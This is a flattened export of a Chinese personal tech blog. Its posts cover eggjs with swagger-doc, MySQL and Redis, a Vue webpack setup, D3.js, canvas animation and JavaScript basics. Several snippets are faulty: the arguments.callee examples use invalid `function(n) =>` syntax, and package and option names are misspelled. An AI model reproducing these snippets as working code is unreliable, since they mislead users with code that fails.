1234567891011121314151617181920212223242526272829303132333435363738394041// plugin.js or plugin.tsconfig.swaggerdoc: &#123; enable: true, // 是否启用。 package: &#x27;egg-swagger-doc&#x27;, // 指定包名称。 &#125;// config.default.js or config.default.ts// egg-swagger-doc 配置信息。 exports.swaggerdoc = &#123; dirScanner: &#x27;./app/controller&#x27;, // 配置自动扫描的控制器路径。 // 接口文档的标题，描述或其它。 apiInfo: &#123; title: &#x27;NAPI&#x27;, // 接口文档的标题。 description: &#x27;swagger-ui for NAPI document.&#x27;, // 接口文档描述。 version: &#x27;1.0.0&#x27;, // 接口文档版本。 &#125;, schemes: [ &#x27;http&#x27;, &#x27;https&#x27; ], // 配置支持的协议。 consumes: [ &#x27;application/json&#x27; ], // 指定处理请求的提交内容类型（Content-Type），例如application/json, text/html。 produces: [ &#x27;application/json&#x27; ], // 指定返回的内容类型，仅当request请求头中的(Accept)类型中包含该指定类型才返回。 securityDefinitions: &#123; // 配置接口安全授权方式。 // apikey: &#123; // type: &#x27;apiKey&#x27;, // name: &#x27;clientkey&#x27;, // in: &#x27;header&#x27;, // &#125;, // oauth2: &#123; // type: &#x27;oauth2&#x27;, // tokenUrl: &#x27;http://petstore.swagger.io/oauth/dialog&#x27;, // flow: &#x27;password&#x27;, // scopes: &#123; // &#x27;write:access_token&#x27;: &#x27;write access_token&#x27;, // &#x27;read:access_token&#x27;: &#x27;read access_token&#x27;, // &#125;, // &#125;, &#125;, enableSecurity: false, // 是否启用授权，默认 false（不启用）。 // enableValidate: true, // 是否启用参数校验，默认 true（启用）。 routerMap: true, // 是否启用自动生成路由，默认 true (启用)。 enable: true, // 默认 true (启用)。 &#125;; 配置忽略token验证1234config.jwt = &#123; enable: true, ignore: [ &#x27;/api/v1/login&#x27;, &#x27;/public/&#x27;, &#x27;/api/v1/register&#x27;, &#x27;/swagger-ui.html&#x27;, &#x27;/swagger-doc&#x27;, &#x27;/swagger-ui.css&#x27;, &#x27;/swagger-ui-bundle.js&#x27;, &#x27;/swagger-ui-standalone-preset.js&#x27; ], &#125; 接口配置123456789101112131415161718192021/** * @summary 添加小说。 * @description 添加小说接口. * @Router post /api/v1/novels * @Request query string name 文章名 * @Request query string sex 性别分类 * @Request query string type 文章分类 * @Request query string desc 小说简介 */ public async create() &#123; const &#123; ctx &#125; = this; const userid = await ctx.service.users.getIdFromToken(ctx); // const index = await ctx.service.chapters.getChapterIndex(); const body = ctx.request.body; const result = await ctx.service.novels.createNovel(&#123; ...body, userid &#125;); if (result) &#123; ctx.body = Object.assign(&#123;&#125;, Code.SUCCESS, &#123; data: result &#125;); &#125; else &#123; ctx.body = Object.assign(&#123;&#125;, Code.NORMAL_ERROR(&#x27;小说保存失败&#x27;)); &#125; &#125;查看结果","tags":[{"name":"eggjs","slug":"eggjs","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/eggjs/"},{"name":"swagger-ui","slug":"swagger-ui","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/swagger-ui/"}]},{"title":"我的闲暇联系之作  uni-app  && eggjs","date":"2020-05-14T02:15:40.000Z","path":"2020/05/14/my-uni-app-and-eggjs-template/","text":"前端 前端主要使用 (typescript 已废弃)javascript 和uniapp进行搭建框架和代码实现，页面结构使用uniapp的样式组件color-ui，图标库使用阿里巴巴矢量图标库 前端git地址: eggjs-uniapp 前端使用技术及bugtypescript 使用 this的使用 1this =&gt; (this as any) interface接口，用于明确的强制一个类去符合某种契约，它描述了类的共有部分，而不是共有和私有俩部分如果使用构造器去定义一个接口并驶入定义一个类去实现折扣时，就会得到一个错误因为当一个类实现了一个接口时，只会对实例部分进行类型检查，constructor存在于类的静态部分，所以不在检查范围 123456789101112interface ClockInterface &#123; currentTime: Date; setTime(d: Date):void; // 在接口中描述一个方法，在类里实现它 // new (hour: number, minute: number); // 构造函数定义一个接口会导致Clock会报错&#125;class Clock implements ClockInterface &#123; // private currentTime: Date = new Date(); // 报错，接口描述了类的公共部分，而不是公共和私有两部分 currentTime: Date = new Date(); constructor(h: number, m: number) &#123; &#125; setTime(d:Date)&#123; this.currentTime = d; &#125;&#125; 前端进度2020-05-17 更换了ui插件 uview 由于typescript对于插件引入不行，决定更换语言 换成javascript，进行项目重构和页面复制 2020-05-19 完成作者作品列表和作品详情页面 后台 后台主要使用eggjs 以及各种第三方插件 后台git地址: eggjs-node 后台插件使用 mysql使用: 参考文章 egg-mysql redis使用: 参考文章 egg-redis 身份验证 token: 参考文章 身份验证 后台进度 2020-04~2020-05-18 注册，登录，token验证，用户个人信息获取，用户个人信息修改 2020-05-19 编写小说上传接口","tags":[{"name":"eggjs","slug":"eggjs","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/eggjs/"},{"name":"typescript","slug":"typescript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/typescript/"},{"name":"uni-app","slug":"uni-app","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/uni-app/"},{"name":"colorui","slug":"colorui","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/colorui/"}]},{"title":"uni-app-life-cycle","date":"2020-05-14T02:14:53.000Z","path":"2020/05/14/uni-app-life-cycle/","text":"","tags":[]},{"title":"D3.js的学习之路","date":"2020-05-07T01:22:16.000Z","path":"2020/05/07/d3-study-20200507/","text":"引入html中引入1&lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/d3/5.16.0/d3.js&quot;&gt;&lt;/script&gt; 核心函数d3.js是链式操作,和promise结构类似,函数执行的返回值都是函数本身 选择器选择元素 D3提供了两种方法来选择元素 d3.select() 返回单元素选择结果,没有匹配的则返回空,多个匹配只返回第一个匹配的元素 d3.select(selector) d3.select(node) 选中指定节点,如果已经引用了一个节点.例如时间监听器的d3.select(this),或者一个全局对象,例如document.body,这个函数不会便利DOM树 d3.selectAll() 返回选中的所有元素,按照文档的遍历顺序,从上到下选择,如果文档中没有匹配的元素则返回空的选择 d3.selectAll(selector) d3.selectAll(nodes) 如果有元素已被引用,例如事件监听器中的d3.selectAll(this.childNodes),或者一个全局的document.links,节点参数不用恰好是数组,任何可以被转换为数据的伪数组都可以,这个函数不会遍历DOM树 操作选择 选择是一组元素,D3绑定额外的方法到数组上面,可以在选中的元素上进行操作,每一个细微的差别都是选择结果的分组,每一个选择都是元素数组中的一个数组,一个单一的元素选择看起来像[[node]] 而不是[node] selection.attr(name[,value])如果指定了value参数,将为所有选中的元素通过指定的name为指定的value设置属性,如果value是一个常数,那么所有的元素都将设置为同样的属性值;如果value是一个函数,那么将会为没有选中的元素计算,入参是当前元素d和当前索引i以及代表当前DOM元素的this上下文,这个函数的返回值接下来用来设置每个元素的属性,null值将一处指定的属性.如果value参数没有指定，就会返回为选择中第一个非空（null）元素所指定的属性值。一般来说，只有当你知道选择中恰好包含一个元素时才有用指定的name参数也会含有一个前缀，例如xlink:href是用来指定Xlink命名空间中href属性的。默认情况下，D3支持svg、xhtml、xlink、xml和 xmlns命名空间。可以添加d3.ns.prefix来注册其他的命名空间 selection.classed(name[,value])selection.classed(&#39;foo&#39;, true)selection.classed(&#39;foo bar&#39;, true)selection.classed(&#123;&#39;foo&#39;, true, &#39;bar&#39;: true&#125;)设置class属性值的便捷程序,他能识别class属性是一个按照空格分隔的标记集合,这样就能使用classList来方便地添加,移除,和切换css类 selection.style(name[,value[,priority]])selection.style(&#123;&#39;stroke&#39;: &#39;black&#39;, &#39;stroke-width&#39;: 2&#125;) selection.property(name[,value])selection.property(&#123;&#39;checked&#39;:true,&#39;disabled&#39;: false&#125;); selection.text([value]) selection.html([value]) selection.appent(name)在当前选择的每个元素最后追加具有指定名称的新元素,返回包含追加元素的新选择 selection.inser(name[,before])在当前选择和指定的before选择器匹配的每个元素之前插入具有指定name的心愿,返回包含插入的元素的新的选择,如果before选择器不匹配任何元素,将会用append追加为最后一个子元素,子元素继承当前元素的数据 selection.remove()删除当前文档当前选中该的元素,返回屏幕外的当前选择,从DOM分离,但是目前被删除的元素无法重新添加,但是可以用append和insert重新添加元素 数据 selection.data([values,[,keys]]) 链接指定的一组数据和当前选择,指定的values是一组数据值,或者一个函数返回的一组值,如果没有指定key函数,则values的第一个数据被分配到当前选择中的第一个元素,第二个数据分配给但钱选择的第二个元素,依次类推.12345678910111213141516171819202122232425262728 &lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/d3/5.16.0/d3.js&quot;&gt;&lt;/script&gt; &lt;title&gt;d3.js - 图形操作工具&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; var matrix = [ [11975, 5871, 8916, 2868], [ 1951, 10048, 2060, 6171], [ 8010, 16145, 8090, 8045], [ 1013, 990, 940, 6907]];var tr = d3.select(&quot;body&quot;).append(&quot;table&quot;).selectAll(&quot;tr&quot;) .data(matrix) .enter().append(&quot;tr&quot;);var td = tr.selectAll(&quot;td&quot;) .data(function(d) &#123; return d; &#125;) .enter().append(&quot;td&quot;) .text(function(d) &#123; return d; &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; selection.enter()返回输入(enter)选择:当前选择中存在但是当前DOM元素中还不存在的每个数据元素的占位符节点,此方法只由data运算符返回的更新选择中定义,输入选择只定义了append,insert,select,call,你必须在使用这些操作符修改任何内容之前实例化输入元素 123456789101112 d3.select(&quot;body&quot;).selectAll(&quot;div&quot;) .data([4, 8, 15, 16, 23, 42]) .enter().append(&quot;div&quot;) .text(function(d) &#123; return d; &#125;);// 效果&lt;div&gt;4&lt;/div&gt;&lt;div&gt;8&lt;/div&gt;&lt;div&gt;15&lt;/div&gt;&lt;div&gt;16&lt;/div&gt;&lt;div&gt;23&lt;/div&gt;&lt;div&gt;42&lt;/div&gt; 另一种方式考虑进入的占位符节点,他们是执行父节点,但是只支持追加和插入 12345var update_sel = svg.selectAll(&quot;circle&quot;).data(data)update_sel.attr(/* operate on old elements only */)update_sel.enter().append(&quot;circle&quot;).attr(/* operate on new elements only */)update_sel.attr(/* operate on old and new elements */)update_sel.exit().remove() /* complete the enter-update-exit pattern */ selection.exit()返回退出选择,找出在当前选择存在的DOM元素中没有新的数据方法,将现有的元素数组和一个含有新的和旧的新数组绑定1var div = d3.select(&quot;body&quot;).selectAll(&quot;div&quot;).data([1,2,4,8,16,32], function (d) &#123;return d&#125;) 离开这些元素原样,我们可以实例化并使用enter选择添加新的元素[1,2,32] 1div.enter().append(&quot;div&quot;).text(function(d) &#123;return d&#125;) 删除退出的元素: div.exit().remove() 123456 &lt;div&gt;4&lt;/div&gt;&lt;div&gt;8&lt;/div&gt;&lt;div&gt;16&lt;/div&gt;&lt;div&gt;1&lt;/div&gt;&lt;div&gt;2&lt;/div&gt;&lt;div&gt;32&lt;/div&gt; 使用索引将生成的元素和序列对上 1div.selectAll(&quot;div&quot;).attr(&quot;index&quot;, function(d,i) =&gt; &#123;return i&#125;) 运行结果 123456 &lt;div index=&quot;2&quot;&gt;4&lt;/div&gt;&lt;div index=&quot;3&quot;&gt;8&lt;/div&gt;&lt;div index=&quot;4&quot;&gt;16&lt;/div&gt;&lt;div index=&quot;0&quot;&gt;1&lt;/div&gt;&lt;div index=&quot;1&quot;&gt;2&lt;/div&gt;&lt;div index=&quot;5&quot;&gt;32&lt;/div&gt; selection.filter(selector) 1var odds = selection.filter(function(d, i) &#123; return i &amp; 1; &#125;); selection.sort([comparator]) selection.order()","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"html","slug":"html","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/html/"},{"name":"d3.js","slug":"d3-js","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/d3-js/"}]},{"title":"使用canvas绘制碰撞球","date":"2020-05-06T02:48:06.000Z","path":"2020/05/06/js-canvas-bubble/","text":"实现步骤 绘制canvas，并将canvas的宽高设置为品目的宽高 由于canvas是行内元素，行内元素一般都有自己的行高等，所以一般会出现横向滚动条，此时需要将canvas设置为块级元素或者行内块状元素 设置canvas的宽高跟随屏幕大小的变化而变化，使用window.onresize监听屏幕变化 设置画布属性(canvas.getContext() 2d or 3d) 填充颜色 (canvas.fillStyle()) 首先绘制出一个圆形，设置圆心位置，半径，和园的角度 canvas.arc(x,y,r,deg1,deg2,true/false) canvas.fillStyle() 填充颜色 将绘制圆形的方法进行封装成一个类，通过调用这个类来循环生成圆形 绘制圆形的运行轨迹，在封装好的类的基础上添加一个移动方法，然后设置定时器，每隔固定时间清除canvas并重新绘制 调整圆形运行轨迹，当圆形触边的时候，使圆形发生反弹 触及x轴，y的移动方向相反，触及y轴，x轴的移动方向相反 实现代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;canvas-球体运动&lt;/title&gt; &lt;style&gt; * &#123; margin: 0; padding: 0; &#125; #canvas &#123; display: block; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;canvas id=&quot;canvas&quot;&gt;&lt;/canvas&gt; &lt;script&gt; const canvas = document.querySelector(&#x27;#canvas&#x27;) const w = window.innerWidth const h = window.innerHeight canvas.width = w canvas.height = h const ct = canvas.getContext(&quot;2d&quot;) ct.fillStyle=&quot;white&quot; ct.fillRect(0,0,w,h) let bubbleArray = [] class Bubble &#123; constructor() &#123; this.init() &#125; init() &#123; this.r = Math.random() * 5 + 3 this.x = Math.random() * w this.y = Math.random() * h this.xt = Math.random() * 2 &lt; 1 ? -Math.random() * 2 - 1 : Math.random() * 2 + 1 this.yt = Math.random() * 2 &lt; 1 ? -Math.random() * 2 - 1 : Math.random() * 2 + 1 this.color = `rgb($&#123;Math.random() * 255&#125;,$&#123;Math.random() * 255&#125;,$&#123;Math.random() * 255&#125;)` &#125; drawer() &#123; ct.beginPath() ct.arc(this.x,this.y,this.r,0, Math.PI*2) ct.fillStyle=this.color ct.fill() &#125; move() &#123; if(this.x+this.r &gt;= w || this.x - this.r &lt; 0) &#123; this.xt = -this.xt &#125; if(this.y+this.r &gt;= h || this.y - this.r &lt; 0) &#123; this.yt = -this.yt &#125; this.x += this.xt this.y += this.yt this.drawer() &#125; &#125; for (let i = 0; i &lt; 500; i++) &#123; const buble = new Bubble() buble.init() buble.drawer() bubbleArray.push(buble) &#125; setInterval(() =&gt; &#123; ct.clearRect(0,0,w,h) for (let i = 0; i &lt; bubbleArray.length; i++) &#123; bubbleArray[i].move() &#125; &#125;,10) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"canvas","slug":"canvas","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/canvas/"}]},{"title":"javascript之arguments.callee","date":"2020-05-05T02:59:56.000Z","path":"2020/05/05/js-arguments-callee/","text":"arguments.callee 在哪个函数中执行，它就代表哪个函数，通常用于匿名函数中在匿名函数中，有时需要自己调用自己，但是由于是匿名函数，没有名字，无法调用，这时可以用arguments.callee来代替匿名的函数 1234567(function(n) =&gt; &#123; if(n &gt; 1) &#123; return n * arguments.callee(n-1) &#125; else &#123; return n &#125;&#125;)() or123456789// 也是立执行函数的一种~~function(n) =&gt; &#123; if(n &gt; 1) &#123; return n * arguments.callee(n-1) &#125; else &#123; return n &#125;&#125;() 计算n的阶乘","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"}]},{"title":"js 判断图片是否完全加载完成","date":"2020-05-05T02:01:12.000Z","path":"2020/05/05/js-img-onload/","text":"原文网址在日常写代码的时候，我们有时候会遇到当图片未加载完成时，会发生高度塌陷，如果这个时候我们获取元素高度的时候获取到的不是元素真正的高度，会造成样式紊乱 window.onload 和ready的区别图片从网络环境下载到本地是需要时间的，当图片灭有下载完的时候，使用js获取到元素的宽高将是0 jquery中的ready方法只是dom元素结构加载完成，便视为完全加载完成，但是此时图片并未加载完成，此时宽高还是0 js的window.onload是指dom生成和资源加载出来后才会执行onload函数 方法一123$(&#x27;img&#x27;).load(function() &#123;&#125;) 缺点是每加载一个图片，回调函数就会执行一次 方法二123456var imgNum = $(&#x27;img&#x27;).length$(&#x27;img&#x27;).load(function() &#123; if(imgNum) &#123; // 加载完成执行方法 &#125;&#125;) 缺点是由于图片是从缓存文件里面拿，load方法根本不执行，只有请求新图片的时候才会走load 方法三利用图片未加载完成时宽高为0来判断图片加载情况123456789101112131415161718192021222324252627282930var t_img; // 定时器var isLoad = true; // 控制变量// 判断图片加载状况，加载完成后回调isImgLoad(function()&#123; // 加载完成&#125;);// 判断图片加载的函数function isImgLoad(callback)&#123; // 注意我的图片类名都是cover，因为我只需要处理cover。其它图片可以不管。 // 查找所有封面图，迭代处理 $(&#x27;.cover&#x27;).each(function()&#123; // 找到为0就将isLoad设为false，并退出each if(this.height === 0)&#123; isLoad = false; return false; &#125; &#125;); // 为true，没有发现为0的。加载完毕 if(isLoad)&#123; clearTimeout(t_img); // 清除定时器 // 回调函数 callback(); // 为false，因为找到了没有加载完成的图，将调用定时器递归 &#125;else&#123; isLoad = true; t_img = setTimeout(function()&#123; isImgLoad(callback); // 递归扫描 &#125;,500); // 我这里设置的是500毫秒就扫描一次，可以自己调整 &#125;&#125;","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"}]},{"title":"javascript 全局函数","date":"2020-05-04T16:38:13.000Z","path":"2020/05/05/js-global-function/","text":"全局函数 decodeURI() 解码某个编码的URI encodeURI() 把字符串编码为URI decodeURIComponent() 解码一个编码的URI组件 encodeURIComponent() 把字符串编码为URI组件 escape() 对字符串进行编码 eval() 计算javascript字符串并把它作为脚本来执行 isFinite() 检查某个值是否为有穷大的数 isNaN() 检查某个值是否是数字 Number() 把对象的值转化为数字 parseFloat() 解析一个字符串并返回一个浮点数 parseInt() 解析一个字符串并返回一个整数 String() 把对象的值转为字符串 unescape() 对由escape()编码的字符串进行解码","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"编码","slug":"编码","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E7%BC%96%E7%A0%81/"}]},{"title":"Array 数组操作","date":"2020-05-04T16:36:09.000Z","path":"2020/05/05/js-array-method/","text":"Array 对象方法 concat() 连接两个或者更多的数组，并返回结果 copyWithin(target, start, end) 将数组的指定位置拷贝元素到数组的另一个指定位置中 （target 指的是元素复制的位数， start指的是元素开始复制的位置，end指的是元素结束复制的位数） entries() 返回一个数组的迭代对象，包含数组的键值对[index, vlaue] every() 检测数组元素的每个元素是否符合条件，如果都满足条件， 返回true，如果不满足返回false some() 检测数值中某个元素是否符合条件，如果有一个符合，返回true，如果全不符合，返回false fill() 使用一个固定值来填充数组 filter() 用于筛选数组，返回符合条件的一个新的数组 find() 返回符合传入测试的数组元素 findIndex() 返回符合传入测试数组元素的索引 forEach() 数组的每一个元素都执行一次回调函数 map() 循环遍历数组中的每一个值，可以用于修改数组 from() Array.from() 通过给定的对象创建一个数组 indexOf() 搜索数组中国的元素，并返回所在位置 includes() 判断一个数组是否包含一个指定的值 isArray() 判断对象是否是数组 join() 把数组中的元素以某个标识拼接为字符串 keys() 返回数组的可迭代对象，包含原始数组的键(key) lastIndexOf() 搜索数组中的元素，并返回它最后出现的位置 pop() 删除数组中的最后一个元素，并返回删除的元素 push() 向数组的末尾添加一个或多个元素，并返回新的长度 reduce() 计算元素，可以用于计算数组，筛选，遍历，从左到右 reduceRight() 计算元素，可以用于计算数组，筛选，遍历，从右到左 reverse() 反转数组的元素顺序 shift() 删除并返回数组的第一个元素 slice(start, end) 选取数组的一部分，并选取一个新数组 sort() 对元素数组进行排序， 可以自定义排序规则 splice(index, many, item) 从数组中添加和删除元素 toString() 将数组转化为字符串，并返回结果 unshift() 向数组开头添加一个或多个元素，并返回新的长度 valueOf() 返回数组对象的原始值","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"array","slug":"array","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/array/"}]},{"title":"从零开始搭建vue的webpack运行环境","date":"2020-05-04T16:29:21.000Z","path":"2020/05/05/vue-webpack-build/","text":"初始化 运行环境12npm init -y// 初始化package.json文件 安装 (webpack和webpack-dev-server)12// 安装webpack和webpack-dev-servernpm install -S webpack webapck-dev-server 配置package.json 和webpack.config.js1234567// package.json&quot;script&quot;: &#123; // 本地运行环境 执行命令 npm run dev &quot;dev&quot;: &quot;webpack-dev-server --open --config webpack-dev-server&quot;, // 打包命令 npm run build &quot;build&quot;: &quot;webpack&quot;&#125; 入口配置和出口环境配置12345678910111213// webpack.config.jsconst path = require(&quot;path&quot;)const config = &#123; entry: &#123; // 入口js配置 app: &#x27;./mian.js&#x27; &#125;, output: &#123; path: path.join(__dirname, &#x27;./dist&#x27;), pubilcPath: &#x27;/dist/&#x27;, filename: &#x27;./app.js&#x27; &#125;&#125; css样式输出配置123456789101112// 安装css-loader style-loadernpm install -S css-loader style-loader// webpack.config.jsmodule: &#123; rules:[ &#123; test: /\\.css$/, use: [&#x27;style-loader&#x27;, &#x27;css-loader&#x27;] &#125; ]&#125; 温馨提示： 在配置文件中的modules对象的rules属性中，可以指定一系列的loaders,每个loader都必须包含test和use两个选项，当webpack编译过程中遇到require和import语句导入一个为.css的文件，将它通过css-loader转换，再通过style-loader转换，然后继续打包，use选项的值可以是数组或者字符串，如果是数组，编译顺序就是从后往前编译 配置 将css整合并生成main.css文件1234567891011121314151617181920212223242526272829// 安装 extract-text-webpack-plugin插件npm install -S extract-text-webpack-plugin// webpack.config.js 配置extract-text-webpack-plugin&#123; // 引入extract-text-webpack-plugin const ExtractTextPlugin = require(&quot;extract-text-webpack-plugin&quot;) module: &#123; rules:[ &#123; test: /\\.css$/, use: ExtractTextPlugin.extract(&#123; use: &#x27;css-loader&#x27;, fallback: &#x27;style-loader&#x27; &#125;) &#125; ] &#125; plugins: [ // 将整合后的css全部集中到dist目录下的mian.css文件中 new ExtractTextPlugin(&quot;mian.css&quot;) ]&#125;// 问题解决error： Use Chunks.groupsIterable and filter by instanceof Entrypoint insteadmethod： extract-text-webpack-plugin版本过低，安装最新版本的extract-text-webpack-plugin// 安装命令npm install --save-dev extract-text-webpack-plugin@4.0.0-beta.0 在webpack中配置vue-loader对.vue格式的文件进行处理​ .vue文件需要安装vue-loader, vye-style-loader ​ es6语法需要安装babel-loader和babel 123456789101112// 安装配置文件npm install --save vuenpm install --save-dev vue-loadernpm install --save-dev vue-style-loadernpm install --save-dev vue-template-compilernpm install --save-dev vue-hot-reload-apinpm install --save-dev babelnpm install --save-dev babel-loadernpm install --save-dev babel-corenpm install --save-dev babel-plugin-transform-runtimenpm install --save-dev babel-preset-es2015npm install --save-dev babel-runtime 123456789101112131415161718192021222324252627282930313233// webpack.config.js 进行配置const VueLoaderPlugin = require(&#x27;vue-loader/lib/plugin&#x27;)module: &#123; rules: [ &#123; test: /\\.css$/, use: ExtractTextPlugin.extract(&#123; use: &#x27;css-loader&#x27;, fallback: &#x27;style-loader&#x27; &#125;) &#125;, &#123; test: /\\.vue$/, loader: &#x27;vue-loader&#x27;, options: &#123; loader: &#123; css: ExtractTextPlugin.extract(&#123; use: &#x27;css-loader&#x27;, fallback: &#x27;vue-style-loader&#x27; &#125;) &#125; &#125; &#125;, &#123; test: /\\.js$/, loader: &#x27;babel-loader&#x27;, exclude: /node_modules/ &#125; ] &#125;, plugins:[ new VueLoaderPlugin() ] vue文件注意事项123456789101112131415 // index.html&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;/dist/main.css&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;app&quot;&gt;&lt;/div&gt; // type=&quot;text/javascript&quot; 必须填写，负责会有部分代码无法识别 &lt;script type=&quot;text/javascript&quot; src=&quot;/dist/main.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 设置文件导入省略后缀12345678resolve: &#123; // js,vue,json 文件可以省略后缀，会自动识别 extensions: [&#x27;.js&#x27;, &#x27;.vue&#x27;, &#x27;.json&#x27;], // 设置别名 /src 可以直接用@代替 alias: &#123; &#x27;@&#x27;: resolve(&#x27;src&#x27;) &#125;&#125; 配置url-loader和file-loader来支持图片、字体等文件1234567891011121314// 安装url-loader和file-loadernpm install -D url-loader file-loader// webpack.config.jsrules: [ &#123; test: /\\.(gif|jpg|png|woff|svg|ect|ttf)\\??.*$/, loader: &#x27;url-loader?limit=1024&#x27; &#125;]// limit=1024 指小于1024b就以base64的形式加载// vue中使用最好使用变量承载图片路径 项目打包依赖123456789101112131415161718192021222324252627282930313233343536373839404142// 安装 webpack-merge 和 htm-webpack-pluginnpm install -D webpack-merge html-webpack-plugin// 新建一个webpack.prod.config.js文件var webpack=require(&#x27;webpack&#x27;);var HtmlwebpackPlugin=require(&#x27;html-webpack-plugin&#x27;);var ExtractTextPlugin=require(&#x27;extract-text-webpack-plugin&#x27;);var merge=require(&#x27;webpack-merge&#x27;);var webpackBaseConfig=require(&#x27;./webpack.config.js&#x27;);const UglifyJsPlugin = require(&#x27;uglifyjs-webpack-plugin&#x27;)//清空基本配置的插件列表module.exports=merge(webpackBaseConfig,&#123;output:&#123;publicPath:&#x27;/dist/&#x27;,// 将入口文件重命名为带有20位hash值的唯一文件filename:&#x27;[name].[hash].js&#x27;&#125;,plugins:[new ExtractTextPlugin(&#123;// 提取css，并重命名为带有20位hash值的唯一文件filename:&#x27;[name].[hash].css&#x27;,allChunks:true&#125;),// 定义当前node环境为生产环境new webpack.DefinePlugin(&#123;&#x27;process.env&#x27;:&#123;NODE_ENV:&#x27;&quot;production&quot;&#x27;&#125;&#125;),// 压缩jsnew UglifyJsPlugin(),// 提取模板，并保存入口html文件new HtmlwebpackPlugin(&#123;filename:&#x27;index.html&#x27;,template:&#x27;./index.html&#x27;,inject:true&#125;),]&#125;);// package.json 添加build设置&quot;build&quot;:&quot;webpack --progress --hide-modules --config webpack.prod.config.js&quot; 报错解决123htmlwebpackPlugin is not defined报错是因为ejs文件的htmlwebpackPlugin拼写错误，换成htmlWebpackPlugin","tags":[{"name":"webpack","slug":"webpack","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/webpack/"},{"name":"Vue","slug":"Vue","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Vue/"}]},{"title":"关于在eggjs中使用mysql进行数据处理","date":"2020-04-12T04:05:35.000Z","path":"2020/04/12/eggjs-mysql/","text":"使用docker 安装mysql 数据库1234567docker pull mysql // 默认拉取最新版本的mysql mysql:5.7 拉取版本号为5.7的mysqldocker docker run -p 3306:3306 --name mysql-test mysql:5.7 // 创建mysql容器 并启动docker start mysql-test //开启mysql 服务docker stop mysql-test // 关闭mysql 服务docker restart mysql-test // 重启mysql 服务 eggjs 使用mysql 安装mysql插件 1npm install egg-mysql --save 在plugin.js 和 config.default.js 配置mysql 1234567891011121314151617181920212223242526272829303132333435// plugin.jsmodule.exports = &#123; mysql: &#123; enable: true, package: &#x27;egg-mysql&#x27;, &#125;,&#125;;// config.default.jsmodule.exports = appInfo =&gt; &#123; const config = exports = &#123;&#125;; config.mysql = &#123; client: &#123; host: &#x27;localhost&#x27;, //链接地址 port: &#x27;3306&#x27;, // 端口号 user: &#x27;root&#x27;, // 用户名 password: &#x27;123456&#x27;, // 密码 database: &#x27;eic-egg&#x27;, // 数据库 &#125;, &#125;; // 解决跨域问题 config.cors = &#123; origin: &#x27;*&#x27;, allowMethods: &#x27;GET,HEAD,PUT,POST,DELETE,PATCH,OPTIONS&#x27;, &#125;; // add your user config here const userConfig = &#123; // myAppName: &#x27;egg&#x27;, &#125;; return &#123; ...config, ...userConfig, &#125;;&#125;; 在项目中使用mysql 查询 1234// 支持自定义查询语句 变量使用?代替app.mysql.query(&#x27;sql语句&#x27;, [value1, value2, ...])eg: app.mysql.query(&#x27;select * from `user` where id = ? &amp; name = ?&#x27;, [id, name]) 插入 1app.mysql.insert(&#x27;table&#x27;, Object)","tags":[{"name":"eggjs","slug":"eggjs","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/eggjs/"},{"name":"mysql","slug":"mysql","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/mysql/"},{"name":"docker","slug":"docker","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/docker/"},{"name":"egg-mysql","slug":"egg-mysql","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/egg-mysql/"}]},{"title":"eggjs token验证(redis & jsonwebtoken)","date":"2020-04-09T17:33:58.000Z","path":"2020/04/10/egg-jwt/","text":"redis 使用安装radislinux环境下安装radis sudo apt-get install redis-server 检查redis服务器系统进程 ps -aux|grep redis 查看redis端口状态 netstat -nlt|grep 6379 